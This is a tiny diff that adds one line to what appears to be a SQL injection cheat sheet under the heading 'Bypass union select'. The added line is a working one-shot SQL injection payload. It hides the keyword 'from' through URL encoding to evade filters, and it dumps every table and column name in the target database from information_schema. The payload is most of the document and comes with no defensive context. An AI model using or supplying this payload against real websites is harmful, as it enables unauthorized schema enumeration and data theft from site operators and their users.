@@ -1,3 +1,4 @@
+(select(@x)%66rom(select(@x:=0x00),(select(0)%66rom(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)   
 
 Bypass union select
 
